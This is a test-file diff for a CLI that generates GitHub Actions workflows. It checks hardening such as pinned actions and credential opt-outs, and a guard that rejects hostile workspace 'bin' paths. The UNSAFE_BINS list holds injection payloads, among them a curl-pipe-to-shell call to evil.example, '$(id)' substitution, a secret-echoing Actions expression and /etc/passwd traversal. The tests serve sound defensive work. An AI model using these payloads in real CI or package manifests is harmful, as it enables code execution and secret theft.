@@ -1,5 +1,5 @@
 import { afterEach, beforeEach, describe, expect, it } from 'bun:test'
-import { existsSync, mkdirSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync } from 'node:fs'
+import { existsSync, mkdirSync, readdirSync, readFileSync, rmSync, statSync, symlinkSync, writeFileSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import { join, relative } from 'node:path'
 import { DOC_OWNERS_PATH } from '@atta/aeg-core'
@@ -11,8 +11,10 @@ import {
   DOCTRINE_POINTER_PATH,
   REVIEW_WORKFLOW_PATH,
   REVIEW_VERDICT_WORKFLOW_PATH,
+  SETUP_BUN_SHA,
   starterConfig
 } from '../src/lib/artifacts.js'
+import { detectVendoredVinaya } from '../src/lib/self-host.js'
 import type { InitDeps } from '../src/commands/init.js'
 import { runInit, runInitProduct } from '../src/commands/init.js'
 import { runEject } from '../src/commands/eject.js'
@@ -168,7 +170,7 @@ describe('vinaya init', () => {
     // on npx's non-interactive cancel. The exact-version `--yes` pin is the
     // fix; this locks it.
     const pkg = JSON.parse(readFileSync(join(import.meta.dir, '..', 'package.json'), 'utf-8')) as { version: string }
-    const hookOps = buildInitOps({ owner: 'acme', repo: 'widget', hookDir: '.husky' }).filter(
+    const hookOps = buildInitOps({ owner: 'acme', repo: 'widget', hookDir: '.husky', selfHost: null }).filter(
       (op) => op.kind === 'managed-block' && /pre-(commit|push)/.test(op.path)
     )
     expect(hookOps.length).toBe(2)
@@ -187,7 +189,7 @@ describe('vinaya init', () => {
     // unconditionally. `vinaya-checks.yml` (CI, pull_request-triggered) is
     // deliberately NOT asserted here — it must omit --local so these checks
     // run for real once a PR exists.
-    const hookOps = buildInitOps({ owner: 'acme', repo: 'widget', hookDir: '.husky' }).filter(
+    const hookOps = buildInitOps({ owner: 'acme', repo: 'widget', hookDir: '.husky', selfHost: null }).filter(
       (op) => op.kind === 'managed-block' && /pre-(commit|push)/.test(op.path)
     )
     expect(hookOps.length).toBe(2)
@@ -204,7 +206,7 @@ describe('vinaya init', () => {
     const after = snapshot(root)
     expect(after).toEqual(before) // nothing written
     // dry-run diff shows the exact bytes a real install writes
-    for (const op of buildInitOps({ owner: 'acme', repo: 'widget', hookDir: '.husky' })) {
+    for (const op of buildInitOps({ owner: 'acme', repo: 'widget', hookDir: '.husky', selfHost: null })) {
       if (op.kind === 'create-file') expect(out).toContain(op.content.trimEnd().split('\n')[0] ?? '')
     }
     expect(out).toContain('nothing was written')
@@ -212,7 +214,7 @@ describe('vinaya init', () => {
 
   it('dry-run output byte-matches what install then writes (content artifacts)', async () => {
     await runInit(['--yes'], makeDeps())
-    for (const op of buildInitOps({ owner: 'acme', repo: 'widget', hookDir: '.husky' })) {
+    for (const op of buildInitOps({ owner: 'acme', repo: 'widget', hookDir: '.husky', selfHost: null })) {
       // vinaya.config.json is the one file whose bytes legitimately differ: the
       // ownership `managed` manifest is injected at apply time. Every other
       // create-file artifact is byte-identical to what the diff showed.
@@ -379,6 +381,396 @@ describe('workflows', () => {
     // A body-only edit must re-trigger the checks workflow so test-plan/
     // closes-n re-evaluate against the corrected body (#870).
     expect(checks).toContain('edited')
+  })
+})
+
+// atta-labs/attalabs#929. In a repo whose workspaces glob reaches a member named
+// `@attalabs/vinaya`, npm resolves `npx --yes @attalabs/vinaya` to that local
+// member — the decision is made on the package NAME, before any version spec is
+// read — and execs its unbuilt `bin`, so every generated job died with `sh:
+// vinaya: command not found`. Both shapes are asserted here: a test that only
+// asserted the old string was asserting the defect.
+describe('generated workflows: published vs vendored invocation (atta-labs/attalabs#929)', () => {
+  const WORKFLOWS = [CHECKS_WORKFLOW_PATH, REVIEW_WORKFLOW_PATH, REVIEW_VERDICT_WORKFLOW_PATH, ARCHIVIST_WORKFLOW_PATH]
+  const VENDORED_BIN = 'node apps/cli/dist/index.js'
+
+  /** Make the fixture a repo that vendors the CLI as a workspace member. */
+  function vendorVinaya(dir = 'apps/cli'): void {
+    writeFileSync(
+      join(root, 'package.json'),
+      `${JSON.stringify({ name: 'vinaya', private: true, workspaces: ['apps/*', 'packages/*'] }, null, 2)}\n`
+    )
+    mkdirSync(join(root, dir), { recursive: true })
+    writeFileSync(
+      join(root, dir, 'package.json'),
+      `${JSON.stringify(
+        {
+          name: '@attalabs/vinaya',
+          version: '0.4.6',
+          bin: { vinaya: './dist/index.js' },
+          scripts: { build: 'bun scripts/build.ts' }
+        },
+        null,
+        2
+      )}\n`
+    )
+  }
+
+  function generated(): Map<string, string> {
+    return new Map(WORKFLOWS.map((p) => [p, readFileSync(join(root, p), 'utf-8')]))
+  }
+
+  /**
+   * One `KEY: ${{ expression }}` env line. Assembled from `SIGIL` rather than
+   * written inline so the literals here carry no `${`, which reads as a broken
+   * JS template to the linter.
+   */
+  const SIGIL = '$'
+  function expr(key: string, expression: string): string {
+    return `${key}: ${SIGIL}{{ ${expression} }}`
+  }
+
+  function occurrences(files: Map<string, string>, needle: string): number {
+    let n = 0
+    for (const content of files.values()) n += content.split(needle).length - 1
+    return n
+  }
+
+  it('ordinary adopter: published npx invocation everywhere, and NO build step', async () => {
+    // The constraint: an adopter has no local copy to build and must not pay
+    // for a problem they do not have.
+    await captureStdout(() => runInit(['--yes'], makeDeps()))
+    const files = generated()
+
+    expect(occurrences(files, 'npx --yes @attalabs/vinaya ')).toBe(6)
+    expect(occurrences(files, 'node apps/cli/dist/index.js')).toBe(0)
+    for (const content of files.values()) {
+      expect(content).not.toContain('setup-bun')
+      expect(content).not.toContain('bun install')
+      expect(content).not.toContain('Build the vendored Vinaya CLI')
+    }
+  })
+
+  it('the verdict retrigger fires on BOTH verdicts — the gate must close, not only open', async () => {
+    // The required check stores a conclusion, and that stored conclusion
+    // guards the merge button. Gating the retrigger on a clean evaluation
+    // made it one-way: an APPROVE turned the check green, and a later
+    // REQUEST CHANGES re-ran nothing, so it kept reporting green while the
+    // PR stayed mergeable. Measured on this repo's own PR #6 — 52 minutes.
+    await captureStdout(() => runInit(['--yes'], makeDeps()))
+    const verdict = generated().get(REVIEW_VERDICT_WORKFLOW_PATH) ?? ''
+
+    expect(verdict).not.toContain("needs.evaluate.result == 'success'")
+    expect(verdict).toContain("!cancelled() && needs.evaluate.result != 'skipped'")
+    // The output it consumes must be resolved before any repo content is
+    // checked out, or a failed evaluation would leave it empty.
+    expect(verdict.indexOf('id: pr')).toBeLessThan(verdict.indexOf('actions/checkout@v4'))
+
+    // ...and it can still be empty, because running on a failed evaluation
+    // makes `Resolve PR head`'s own failure reachable here for the first
+    // time. `gh run list --branch ""` drops the filter and matches every
+    // branch, so an unguarded rerun lands on an unrelated PR's gate.
+    expect(verdict).toContain('if [ -z "$BRANCH" ]')
+    expect(verdict.indexOf('if [ -z "$BRANCH" ]')).toBeLessThan(verdict.indexOf('gh run list'))
+  })
+
+  it('ordinary adopter: gains the credential opt-out, and no vendored token', async () => {
+    // The adopter shape emits `persist-credentials: false` on all 6 of its
+    // checkouts and nothing vendored. The opt-out is deliberate rather than
+    // incidental: the checkout default writes GITHUB_TOKEN into .git/config,
+    // and no generated job pushes, so no job needs it. Asserted here because
+    // an adopter regenerates these files on `upgrade` — a silent change to
+    // the adopter shape reaches every install.
+    await captureStdout(() => runInit(['--yes'], makeDeps()))
+    const files = generated()
+
+    for (const [path, content] of files) {
+      if (!content.includes('actions/checkout@v4')) continue
+      const checkouts = content.split('actions/checkout@v4').length - 1
+      const optOuts = content.split('persist-credentials: false').length - 1
+      expect(`${path}: ${optOuts}/${checkouts}`).toBe(`${path}: ${checkouts}/${checkouts}`)
+    }
+
+    // Everything the vendored shape adds stays absent — the adopter still
+    // pays nothing for a problem it does not have.
+    for (const content of files.values()) {
+      expect(content).not.toContain('setup-bun')
+      expect(content).not.toContain('--ignore-scripts')
+      expect(content).not.toContain('Build the vendored Vinaya CLI')
+    }
+  })
+
+  it('vendoring repo: the build job is hardened — pinned action, no scripts, no creds', async () => {
+    // Each of these is a security review finding, and each is invisible to a
+    // test that only checks the invocation moved.
+    vendorVinaya()
+    await captureStdout(() => runInit(['--yes'], makeDeps()))
+    const files = generated()
+
+    // The first THIRD-PARTY action this generator writes into an adopter repo,
+    // in the job that then builds and runs PR code: pinned to a commit, so a
+    // repoint of the mutable tag cannot execute new upstream code everywhere.
+    expect(occurrences(files, 'oven-sh/setup-bun@v2')).toBe(0)
+    expect(occurrences(files, `oven-sh/setup-bun@${SETUP_BUN_SHA}`)).toBe(6)
+
+    // The install runs against the PR's own dependency manifest.
+    expect(occurrences(files, 'bun install --frozen-lockfile --ignore-scripts')).toBe(6)
+    expect(occurrences(files, 'bun install --frozen-lockfile\n')).toBe(0)
+
+    // Default checkout writes GITHUB_TOKEN into .git/config as an http
+    // extraheader — in the same workspace the build then executes.
+    for (const [path, content] of files) {
+      if (!content.includes('actions/checkout@v4')) continue
+      const checkouts = content.split('actions/checkout@v4').length - 1
+      const optOuts = content.split('persist-credentials: false').length - 1
+      expect(`${path}: ${optOuts}/${checkouts}`).toBe(`${path}: ${checkouts}/${checkouts}`)
+    }
+  })
+
+  it('vendoring repo: builds and invokes its OWN CLI by path, never npx', async () => {
+    vendorVinaya()
+    await captureStdout(() => runInit(['--yes'], makeDeps()))
+    const files = generated()
+
+    // All six invocations move — none left on the broken path.
+    expect(occurrences(files, 'npx --yes @attalabs/vinaya')).toBe(0)
+    expect(occurrences(files, VENDORED_BIN)).toBe(6)
+    // Every job carrying an invocation first builds the member it invokes.
+    expect(occurrences(files, `oven-sh/setup-bun@${SETUP_BUN_SHA}`)).toBe(6)
+    expect(occurrences(files, 'bun run --cwd apps/cli build')).toBe(6)
+
+    // Per-file: the exact subcommands, in the built-binary shape.
+    const checks = files.get(CHECKS_WORKFLOW_PATH) ?? ''
+    const review = files.get(REVIEW_WORKFLOW_PATH) ?? ''
+    const verdict = files.get(REVIEW_VERDICT_WORKFLOW_PATH) ?? ''
+    const archivist = files.get(ARCHIVIST_WORKFLOW_PATH) ?? ''
+    expect(checks).toContain(`${VENDORED_BIN} check --all --diff-only`)
+    expect(review).toContain(`${VENDORED_BIN} check review-gate`)
+    expect(verdict).toContain(`${VENDORED_BIN} check review-gate`)
+    expect(archivist).toContain(`${VENDORED_BIN} archive --merge-sha=${SIGIL}{{ github.sha }}`)
+    expect(archivist).toContain(`${VENDORED_BIN} audit --only=dead-branches`)
+    expect(archivist).toContain(`${VENDORED_BIN} audit --only=direct-push --sha=${SIGIL}{{ github.sha }}`)
+    // The retrigger job executes no repo content and gains no build step.
+    expect(occurrences(new Map([[ARCHIVIST_WORKFLOW_PATH, archivist]]), 'setup-bun')).toBe(3)
+  })
+
+  it('every env: wiring survives in BOTH shapes', async () => {
+    // PR_BODY/PR_NUMBER are what make the checks EVALUATE rather than pass
+    // vacuously; GH_TOKEN and BRANCH are load-bearing too. Changing how the
+    // binary is reached must not drop any of them.
+    for (const vendored of [false, true]) {
+      rmSync(root, { recursive: true, force: true })
+      mkdirSync(root, { recursive: true })
+      if (vendored) vendorVinaya()
+      await captureStdout(() => runInit(['--yes'], makeDeps()))
+      const files = generated()
+      const checks = files.get(CHECKS_WORKFLOW_PATH) ?? ''
+      const review = files.get(REVIEW_WORKFLOW_PATH) ?? ''
+      const verdict = files.get(REVIEW_VERDICT_WORKFLOW_PATH) ?? ''
+
+      expect(checks).toContain(expr('PR_BODY', 'github.event.pull_request.body'))
+      expect(checks).toContain(expr('PR_NUMBER', 'github.event.pull_request.number'))
+      expect(checks).toContain(expr('BRANCH', 'github.head_ref'))
+      expect(review).toContain(expr('PR_NUMBER', 'github.event.pull_request.number'))
+      expect(review).toContain(expr('BRANCH', 'github.head_ref'))
+      expect(verdict).toContain(expr('PR_NUMBER', 'steps.pr.outputs.number'))
+      expect(verdict).toContain(expr('BRANCH', 'steps.pr.outputs.branch'))
+      // GH_TOKEN on every step that talks to the forge: checks 1, review 1,
+      // verdict 3 (resolve-head, evaluate, retrigger), archivist 3.
+      expect(occurrences(files, expr('GH_TOKEN', 'secrets.GITHUB_TOKEN'))).toBe(8)
+    }
+  })
+
+  it('the hook stubs keep their own version-pinned npx — a different, still-live fix', async () => {
+    // The hooks pin `@<version>` for the npx cache-key regression, which this
+    // change does not touch. A vendoring repo's hooks stay exactly as they are.
+    vendorVinaya()
+    await captureStdout(() => runInit(['--yes'], makeDeps()))
+    const pkg = JSON.parse(readFileSync(join(import.meta.dir, '..', 'package.json'), 'utf-8')) as { version: string }
+    const hook = readFileSync(join(root, '.husky/pre-commit'), 'utf-8')
+    expect(hook).toContain(`npx --yes @attalabs/vinaya@${pkg.version} check`)
+  })
+})
+
+describe('detectVendoredVinaya', () => {
+  it('is null for a repo with no package.json, no workspaces, or no such member', () => {
+    expect(detectVendoredVinaya(root)).toBeNull() // bare fixture: README.md only
+
+    writeFileSync(join(root, 'package.json'), '{ "name": "widget" }\n')
+    expect(detectVendoredVinaya(root)).toBeNull() // no workspaces field
+
+    writeFileSync(join(root, 'package.json'), '{ "name": "widget", "workspaces": ["apps/*"] }\n')
+    mkdirSync(join(root, 'apps/web'), { recursive: true })
+    writeFileSync(join(root, 'apps/web/package.json'), '{ "name": "@widget/web" }\n')
+    expect(detectVendoredVinaya(root)).toBeNull() // a workspace, but not ours
+  })
+
+  it('never throws on a malformed root package.json — an adopter install must not die on it', () => {
+    writeFileSync(join(root, 'package.json'), '{ not json at all\n')
+    expect(detectVendoredVinaya(root)).toBeNull()
+  })
+
+  it('finds the member through a glob and honours its declared bin', () => {
+    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["apps/*"] }\n')
+    mkdirSync(join(root, 'apps/cli'), { recursive: true })
+    writeFileSync(
+      join(root, 'apps/cli/package.json'),
+      '{ "name": "@attalabs/vinaya", "bin": { "vinaya": "./dist/index.js" } }\n'
+    )
+    expect(detectVendoredVinaya(root)).toEqual({ dir: 'apps/cli', bin: 'apps/cli/dist/index.js' })
+  })
+
+  it('accepts the { packages: [...] } workspaces form and a non-default bin path', () => {
+    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": { "packages": ["tools/vinaya"] } }\n')
+    mkdirSync(join(root, 'tools/vinaya'), { recursive: true })
+    writeFileSync(join(root, 'tools/vinaya/package.json'), '{ "name": "@attalabs/vinaya", "bin": "build/cli.js" }\n')
+    expect(detectVendoredVinaya(root)).toEqual({ dir: 'tools/vinaya', bin: 'tools/vinaya/build/cli.js' })
+  })
+
+  // Both fields land in a workflow `run:` as bare shell words, and both come
+  // from the target repo. Each payload below was reproduced end-to-end against
+  // the unguarded version — these are regressions, not hypotheticals.
+  const UNSAFE_BINS: Array<[string, string]> = [
+    ['a command separator', 'dist/i.js; curl https://evil.example/s.sh | sh'],
+    ['command substitution', 'dist/$(id).js'],
+    ['backtick substitution', 'dist/`id`.js'],
+    ['a newline, which injects an entire extra step', 'dist/i.js\n      - run: id'],
+    // biome-ignore lint/suspicious/noTemplateCurlyInString: GitHub Actions expression syntax, deliberately a plain string — it is the payload
+    ['an Actions expression, which reaches secrets', 'dist/i.js; echo ${{ secrets.NPM_TOKEN }}'],
+    ['a pipe', 'dist/i.js | tee /tmp/x'],
+    ['traversal out of the member', '../../../etc/passwd']
+  ]
+
+  for (const [label, bin] of UNSAFE_BINS) {
+    it(`refuses a bin containing ${label} — falls back to the adopter shape`, () => {
+      writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["apps/*"] }\n')
+      mkdirSync(join(root, 'apps/cli'), { recursive: true })
+      writeFileSync(
+        join(root, 'apps/cli/package.json'),
+        JSON.stringify({ name: '@attalabs/vinaya', bin: { vinaya: bin } })
+      )
+      expect(detectVendoredVinaya(root)).toBeNull()
+    })
+  }
+
+  it('refuses an unsafe member directory even with no bin declared', () => {
+    // `$(id)` is a legal directory name and `apps/*` matches it, so the
+    // package.json need not be hostile at all.
+    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["apps/*"] }\n')
+    mkdirSync(join(root, 'apps/$(id)'), { recursive: true })
+    writeFileSync(join(root, 'apps/$(id)/package.json'), '{ "name": "@attalabs/vinaya" }\n')
+    expect(detectVendoredVinaya(root)).toBeNull()
+  })
+
+  it('refuses a member reached by a traversing workspace pattern', () => {
+    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["../outside/*"] }\n')
+    mkdirSync(join(root, '../outside/pkg'), { recursive: true })
+    writeFileSync(join(root, '../outside/pkg/package.json'), '{ "name": "@attalabs/vinaya" }\n')
+    try {
+      expect(detectVendoredVinaya(root)).toBeNull()
+    } finally {
+      rmSync(join(root, '../outside'), { recursive: true, force: true })
+    }
+  })
+
+  it('refuses a member directory whose name starts with a dash', () => {
+    // `-e` / `--eval` reach `node` in argument position. Node ACCEPTS a
+    // detached value (`node -e 'code'` runs it) and rejects the attached
+    // form, which is the only form the emitted single-token path can take —
+    // see self-host.ts. So this breaks CI rather than executing, and the
+    // property keeping it that way is not enforced anywhere else.
+    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["apps/*"] }\n')
+    mkdirSync(join(root, 'apps/-e'), { recursive: true })
+    writeFileSync(join(root, 'apps/-e/package.json'), '{ "name": "@attalabs/vinaya" }\n')
+    expect(detectVendoredVinaya(root)).toBeNull()
+  })
+
+  it('accepts a scoped member directory — the shape this feature exists for', () => {
+    // `@` is an ordinary directory character and means nothing to the shell.
+    // Refusing it would degrade a scoped member into the broken `npx` shape.
+    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["packages/*/*"] }\n')
+    mkdirSync(join(root, 'packages/@attalabs/vinaya'), { recursive: true })
+    writeFileSync(join(root, 'packages/@attalabs/vinaya/package.json'), '{ "name": "@attalabs/vinaya" }\n')
+    expect(detectVendoredVinaya(root)).toEqual({
+      dir: 'packages/@attalabs/vinaya',
+      bin: 'packages/@attalabs/vinaya/dist/index.js'
+    })
+  })
+
+  it('collapses runs of stars before the bound counts them', () => {
+    // Behavioural, not timed. A wall-clock assertion cannot see this: with
+    // collapsing removed the worst shape costs ~248ms, under any threshold
+    // loose enough to survive a loaded runner. Two earlier forms of this test
+    // passed with the mechanism disabled for exactly that reason.
+    //
+    // Collapsing is a widening, and that is what makes it observable. Eight
+    // ADJACENT stars exceed MAX_SEGMENT_STARS as typed and are refused; they
+    // collapse to one star, which is the same glob, and resolve. Non-adjacent
+    // stars survive collapsing and are still counted, so the bound is not
+    // weakened — the second half asserts that.
+    mkdirSync(join(root, 'apps/cli'), { recursive: true })
+    writeFileSync(join(root, 'apps/cli/package.json'), '{ "name": "@attalabs/vinaya" }\n')
+
+    // 8 adjacent stars -> collapses to `c*i` -> matches
+    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["apps/c********i"] }\n')
+    expect(detectVendoredVinaya(root)).toEqual({ dir: 'apps/cli', bin: 'apps/cli/dist/index.js' })
+
+    // 8 separated stars -> collapsing changes nothing -> still over the bound.
+    // The pattern MUST be one that would otherwise match: `c*l*i*x*y*z*w*v*q`
+    // matches no directory either way, so it could not observe the bound.
+    mkdirSync(join(root, 'apps/clixyzwvq'), { recursive: true })
+    writeFileSync(join(root, 'apps/clixyzwvq/package.json'), '{ "name": "@attalabs/vinaya" }\n')
+    rmSync(join(root, 'apps/cli'), { recursive: true, force: true })
+    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["apps/c*l*i*x*y*z*w*v*q"] }\n')
+    expect(detectVendoredVinaya(root)).toBeNull()
+  })
+
+  it('refuses a segment with more stars than the bound allows', () => {
+    // Deliberately behavioural rather than timed. A wall-clock assertion here
+    // passed with the bound disabled — 8 stars against a 37-char name is only
+    // ~69ms unguarded, well under any threshold loose enough to survive a
+    // loaded runner. This pair discriminates on the bound itself: same
+    // directory, same match, one star either side of MAX_SEGMENT_STARS.
+    const vendor = () => {
+      mkdirSync(join(root, 'apps/aaaaab'), { recursive: true })
+      writeFileSync(join(root, 'apps/aaaaab/package.json'), '{ "name": "@attalabs/vinaya" }\n')
+    }
+
+    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["apps/a*a*a*a*a*b"] }\n') // 5
+    vendor()
+    expect(detectVendoredVinaya(root)).toBeNull()
+
+    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["apps/a*a*a*a*b"] }\n') // 4
+    expect(detectVendoredVinaya(root)).toEqual({ dir: 'apps/aaaaab', bin: 'apps/aaaaab/dist/index.js' })
+  })
+
+  it('refuses a literal workspace segment that symlinks outside the repo', () => {
+    // The `..` rule is textual and cannot see this: `vendored` is a clean
+    // relative path. The wildcard route is already safe (Dirent.isDirectory()
+    // is false for a symlink); this is the literal route.
+    const outside = join(root, '..', `outside-${Date.now()}`)
+    mkdirSync(outside, { recursive: true })
+    writeFileSync(join(outside, 'package.json'), '{ "name": "@attalabs/vinaya" }\n')
+    try {
+      symlinkSync(outside, join(root, 'vendored'))
+      writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["vendored"] }\n')
+      expect(detectVendoredVinaya(root)).toBeNull()
+    } finally {
+      rmSync(outside, { recursive: true, force: true })
+    }
+  })
+
+  it('still accepts the ordinary paths the guard must not break', () => {
+    writeFileSync(join(root, 'package.json'), '{ "name": "v", "workspaces": ["packages/*"] }\n')
+    mkdirSync(join(root, 'packages/vinaya-cli.v2'), { recursive: true })
+    writeFileSync(
+      join(root, 'packages/vinaya-cli.v2/package.json'),
+      '{ "name": "@attalabs/vinaya", "bin": "./dist/index.js" }\n'
+    )
+    expect(detectVendoredVinaya(root)).toEqual({
+      dir: 'packages/vinaya-cli.v2',
+      bin: 'packages/vinaya-cli.v2/dist/index.js'
+    })
   })
 })
 
